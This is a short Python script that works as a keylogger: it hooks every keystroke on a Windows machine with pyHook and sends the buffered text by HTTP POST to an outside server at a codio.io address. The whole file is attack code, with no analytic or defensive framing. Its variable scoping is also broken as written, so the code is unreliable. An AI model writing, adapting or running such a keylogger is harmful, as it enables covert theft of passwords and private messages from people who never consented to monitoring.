import sys, pyHook, pythoncom, urllib, httplib2

api_url = 'http://taboo-watch-8080.codio.io/api'
id = 0
buffer = ''

def SendData():
	h = httplib2.Http(".cache")
	data = urllib.urlencode({"id":id,"message":buffer})
	resp, content = h.request(api_url, "POST", data)

	buffer = ''

	return True

def OnKeyboardEvent(event):
    buffer += chr(event.Ascii)

    if len(buffer) > 6:
    	SendData()

    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()